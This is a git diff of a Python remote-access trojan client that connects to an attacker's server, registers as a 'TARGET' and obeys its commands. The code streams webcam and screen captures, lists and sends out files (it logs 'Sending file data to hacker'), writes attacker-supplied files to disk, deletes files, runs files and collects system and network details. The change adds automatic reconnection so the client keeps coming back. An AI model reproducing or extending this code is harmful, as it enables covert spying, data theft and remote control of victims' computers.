@@ -5,7 +5,7 @@ import pickle
 import struct
 import os
 from psutil import users, boot_time, virtual_memory, swap_memory, disk_partitions, disk_usage, net_if_addrs
-from platform import uname
+import platform
 from datetime import datetime
 from uuid import getnode
 from re import findall
@@ -14,19 +14,6 @@ from sys import getsizeof
 import json
 from io import BytesIO
 from pyautogui import screenshot
-
-with open('settings.json', 'r') as f:
-    data = json.load(f)
-    IP = data[0]["IP"] 
-    PORT = data[0]["PORT"] 
-    NAME = data[0]["NAME"] 
-    ID = data[0]["ID"] 
-
-    if IP == None and PORT == None and NAME == None and ID == None:
-        print("Settings not configured.")
-        quit()
-        
-s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
 def get_size(bytes, suffix="B"):
     factor = 1024
@@ -39,7 +26,7 @@ def System_information():
     listt = []
 
     dictionary = {}
-    uname = uname()
+    uname = platform.uname()
     user_list = users()
     usernamee = []
     for user in user_list:
@@ -52,12 +39,10 @@ def System_information():
     dictionary.update({"Release" : uname.release})
     dictionary.update({"Version": uname.version})
     dictionary.update({"Machine": uname.machine})
-    #try:
-        #dictionary.update({"Processor":cpuinfo.get_cpu_info()['brand_raw'] })
-    #except:
     dictionary.update({"Processor":'Couldnt get details'})
     dictionary.update({"Ip-Address": socket.gethostbyname(socket.gethostname())})
     dictionary.update({"Mac-Address": ':'.join(findall('..', '%012x' % getnode()))})
+    
     listt.append({"System Information": dictionary})
 
     boot_time_timestamp = boot_time()
@@ -109,9 +94,6 @@ def System_information():
 
                 dictionary5.update({interface_name:{"Ip Address": address.address, "Netmask": address.netmask, "Broadcast IP" : address.broadcast}})
     ip = get('https://api.ipify.org/').text
-
-
-
     dictionary5.update({"Public IP": ip})
     
     listt.append({"Network": dictionary5})
@@ -119,202 +101,227 @@ def System_information():
     return listt
 
 
-print('[CONNECTION] Attempting to connect to the server.')
-
-
 while True:
     try:
-        s.connect((IP,PORT))
-        break
-    except ConnectionRefusedError:
-        continue
+        with open('settings.json', 'r') as f:
+            data = json.load(f)
+            IP = data[0]["IP"] 
+            PORT = data[0]["PORT"] 
+            NAME = data[0]["NAME"] 
+            ID = data[0]["ID"] 
 
+            if IP == None and PORT == None and NAME == None and ID == None:
+                print("Settings not configured.")
+                quit()
+                
+        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
-s.send(bytes(f'TARGET|{NAME}|{ID}','utf-8'))
-print('[CONNECTION] Connected to the server.')
+        print('[CONNECTION] Attempting to connect to the server.')
 
-
-print('[LOG] Listening for commands.')
-
-while True:
-    try:
-        command = s.recv(300).decode('utf-8')
-    except ConnectionResetError:
-        print("Error: Server offline.")
-        break
-
-    if command == 'GET_CAMERA_FOOTAGE':
-        vid = cv2.VideoCapture(0, cv2.CAP_DSHOW)
-
-        print('[COMMAND] Sending camera footage.')
 
         while True:
-            ret, frame = vid.read()
-
-            frame_pkld = pickle.dumps(frame)
-
-            byte_size = len(frame_pkld)
-            frame_pckd = struct.pack('Q', byte_size)
-
-            s.send(frame_pckd)
-            s.sendall(frame_pkld)
-
-            proceed = s.recv(1).decode()
-            
-            if proceed == 'Y':
-                continue
-            else:
-                vid.release()
+            try:
+                s.connect((IP,PORT))
                 break
+            except ConnectionRefusedError:
+                continue
 
-        print('[LOG] Finished sending camera footage.')
 
-    elif command == 'GET_SCREEN_CAPTURE':
-        print('[COMMAND] Sending screen capture.')
+        s.send(bytes(f'TARGET|{NAME}|{ID}','utf-8'))
+        print('[CONNECTION] Connected to the server.')
 
-        #screen = mss.mss()
-        #monitor = screen.monitors[0]
+
+        print('[LOG] Listening for commands.')
 
         while True:
-            #ss = screen.grab(monitor)
-            ss = screenshot()
-
-            image_buffer = BytesIO()
-            #img = Image.frombytes("RGB", ss.size, ss.rgb)
-            ss.save(image_buffer, format="JPEG", quality=50)
-
-            ss_pkld = pickle.dumps(image_buffer)
-
-            byte_size = len(ss_pkld)
-            ss_pckd = struct.pack('Q', byte_size)
-
-            s.send(ss_pckd)
-            s.sendall(ss_pkld)
-
-            proceed = s.recv(1).decode()
-            
-            if proceed == 'Y':
-                continue
-            else:
+            try:
+                command = s.recv(300).decode('utf-8')
+            except ConnectionResetError:
+                print("Connection lost. Attempting to connect again.")
                 break
-            
-        print('[LOG] Finished sharing screen capture.')
 
-    elif command == 'GET_FILES':
-        dir = s.recv(300).decode('utf-8')
+            if command == 'GET_CAMERA_FOOTAGE':
+                vid = cv2.VideoCapture(0, cv2.CAP_DSHOW)
 
-        if dir == 'None':
-            dir = os.getcwd()
+                print('[COMMAND] Sending camera footage.')
 
-        try:
-            files = [f for f in os.listdir(dir) if os.path.isfile(os.path.join(dir, f))]
-            folders = os.listdir(dir)
-        except:
-            dict = {'invalid':'invalid'}
-            dict = pickle.dumps(dict)
+                while True:
+                    ret, frame = vid.read()
 
-            s.sendall(dict)
-            continue
+                    frame_pkld = pickle.dumps(frame)
 
-        to_be_removed = []
+                    byte_size = len(frame_pkld)
+                    frame_pckd = struct.pack('Q', byte_size)
 
-        for i in folders:
-            if i in files:
-                to_be_removed.append(i)
+                    s.send(frame_pckd)
+                    s.sendall(frame_pkld)
 
-        for i in to_be_removed:
-            folders.remove(i)
+                    proceed = s.recv(1).decode()
+                    
+                    if proceed == 'Y':
+                        continue
+                    else:
+                        vid.release()
+                        break
 
-        dict = {'files':files, 'folders':folders, 'dir':dir}
-        dict = pickle.dumps(dict)
+                print('[LOG] Finished sending camera footage.')
 
-        s.sendall(dict)
-        print('[LOG] Task completed.')
+            elif command == 'GET_SCREEN_CAPTURE':
+                print('[COMMAND] Sending screen capture.')
 
-    elif command == 'DOWNLOAD_FILE':
-        dir = s.recv(300).decode('utf-8')
-        print(dir)
+                #screen = mss.mss()
+                #monitor = screen.monitors[0]
 
-        try:
-            with open(dir, 'rb') as f:
+                while True:
+                    #ss = screen.grab(monitor)
+                    ss = screenshot()
+
+                    image_buffer = BytesIO()
+                    #img = Image.frombytes("RGB", ss.size, ss.rgb)
+                    ss.save(image_buffer, format="JPEG", quality=50)
+
+                    ss_pkld = pickle.dumps(image_buffer)
+
+                    byte_size = len(ss_pkld)
+                    ss_pckd = struct.pack('Q', byte_size)
+
+                    s.send(ss_pckd)
+                    s.sendall(ss_pkld)
+
+                    proceed = s.recv(1).decode()
+                    
+                    if proceed == 'Y':
+                        continue
+                    else:
+                        break
+                    
+                print('[LOG] Finished sharing screen capture.')
+
+            elif command == 'GET_FILES':
+                dir = s.recv(300).decode('utf-8')
+
+                if dir == 'None':
+                    dir = os.getcwd()
+
+                try:
+                    files = [f for f in os.listdir(dir) if os.path.isfile(os.path.join(dir, f))]
+                    folders = os.listdir(dir)
+                except:
+                    dict = {'invalid':'invalid'}
+                    dict = pickle.dumps(dict)
+
+                    s.sendall(dict)
+                    continue
+
+                to_be_removed = []
+
+                for i in folders:
+                    if i in files:
+                        to_be_removed.append(i)
+
+                for i in to_be_removed:
+                    folders.remove(i)
+
+                dict = {'files':files, 'folders':folders, 'dir':dir}
+                dict = pickle.dumps(dict)
+
+                s.sendall(dict)
+                print('[LOG] Task completed.')
+
+            elif command == 'DOWNLOAD_FILE':
+                dir = s.recv(300).decode('utf-8')
+                print(dir)
+
+                try:
+                    with open(dir, 'rb') as f:
+                        f.close()
+                    s.send(bytes('VALID','utf-8'))
+
+                except:
+                    s.send(bytes('INVALID','utf-8'))
+                    continue
+                
+                print('[LOG] Sending file data to hacker.')
+
+                file_size = os.path.getsize(dir)
+
+                s.send(bytes(f"{file_size}",'utf-8'))
+                time.sleep(3)
+
+                file = open(dir, 'rb')
+                
+                data = file.read()
+                s.sendall(data)
+                file.close()
+
+                print('[LOG] Successfully uploaded a file.')
+
+            elif command == 'UPLOAD':
+                details = s.recv(300).decode('utf-8')
+                details = details.split('|')
+
+                file_name = details[0]
+                path = details[1]
+
+                try:
+                    f = open(f'{path}\\{file_name}','wb')
+                
+                except:
+                    s.send(bytes('INVALID','utf-8'))
+                    continue
+
+                s.send(bytes('VALID','utf-8'))
+
+                file_size = s.recv(300).decode('utf-8')
+
+                data = s.recv(int(file_size))
+
+                f = open(f'{path}\\{file_name}','wb')
+                f.write(data)
                 f.close()
-            s.send(bytes('VALID','utf-8'))
+                
+                print('[LOG] Successfully downloaded a file.')
+                
+            elif command == 'DELETE':
+                file_name = s.recv(300).decode('utf-8')
 
-        except:
-            s.send(bytes('INVALID','utf-8'))
-            continue
-        
-        print('[LOG] Sending file data to hacker.')
+                try:
+                    os.remove(file_name)
+                except:
+                    s.send(bytes('INVALID','utf-8'))
+                    continue
 
-        file_size = os.path.getsize(dir)
+                s.send(bytes('VALID','utf-8'))
 
-        s.send(bytes(f"{file_size}",'utf-8'))
-        time.sleep(3)
+                print('[LOG] Successfully deleted a file.')
 
-        file = open(dir, 'rb')
-        
-        data = file.read()
-        s.sendall(data)
-        file.close()
+            elif command == 'RUN':
+                file = s.recv(500).decode('utf-8')
 
-        print('[LOG] Successfully uploaded a file.')
+                try:
+                    os.startfile(file)
+                except:
+                    s.send(bytes('INVALID','utf-8'))
+                
+                s.send(bytes('VALID','utf-8'))
 
-    elif command == 'UPLOAD':
-        details = s.recv(300).decode('utf-8')
-        details = details.split('|')
+            elif command == 'GET_TARGET_DETAILS':
+                details = System_information()
+                details = pickle.dumps(details)
 
-        file_name = details[0]
-        path = details[1]
+                s.send(bytes(f'{getsizeof(details)}','utf-8'))
+                time.sleep(1)
 
-        try:
-            f = open(f'{path}\\{file_name}','wb')
-        
-        except:
-            s.send(bytes('INVALID','utf-8'))
-            continue
+                s.sendall(details)
 
-        s.send(bytes('VALID','utf-8'))
+        s.close()
 
-        file_size = s.recv(300).decode('utf-8')
-
-        data = s.recv(int(file_size))
-
-        f = open(f'{path}\\{file_name}','wb')
-        f.write(data)
-        f.close()
-        
-        print('[LOG] Successfully downloaded a file.')
-        
-    elif command == 'DELETE':
-        file_name = s.recv(300).decode('utf-8')
+    except:
+        print("Lost connection. Attempting to connect with the server again.")
 
         try:
-            os.remove(file_name)
+            s.close()
         except:
-            s.send(bytes('INVALID','utf-8'))
-            continue
-
-        s.send(bytes('VALID','utf-8'))
-
-        print('[LOG] Successfully deleted a file.')
-
-    elif command == 'RUN':
-        file = s.recv(500).decode('utf-8')
-
-        try:
-            os.startfile(file)
-        except:
-            s.send(bytes('INVALID','utf-8'))
+            pass
         
-        s.send(bytes('VALID','utf-8'))
-
-    elif command == 'GET_TARGET_DETAILS':
-        details = System_information()
-        details = pickle.dumps(details)
-
-        s.send(bytes(f'{getsizeof(details)}','utf-8'))
-        time.sleep(1)
-
-        s.sendall(details)
-
-print("QUIT")
+        continue
